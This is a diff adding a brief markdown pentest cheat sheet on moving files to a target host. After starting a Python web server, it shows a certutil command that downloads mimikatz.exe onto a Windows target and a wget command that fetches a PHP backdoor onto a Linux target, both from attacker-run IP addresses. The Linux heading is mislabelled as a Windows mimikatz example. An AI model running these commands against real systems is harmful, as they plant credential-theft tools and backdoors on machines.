@@ -1,0 +1,27 @@
+#### Setting Up A Web Server With Python
+
+###### Python2
+
+```
+python2.x -m SimpleHTTPServer 80
+```
+
+###### Python3
+
+```
+python3.x -m http.server 80
+```
+
+---
+
+###### Windows target- Example : transfering mimikatz to windows target
+
+```
+certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatz.exe
+```
+
+###### LInux target - Example : transfering mimikatz to windows target
+
+```
+wget http://192.196.45.2/php-backdoor.php
+```
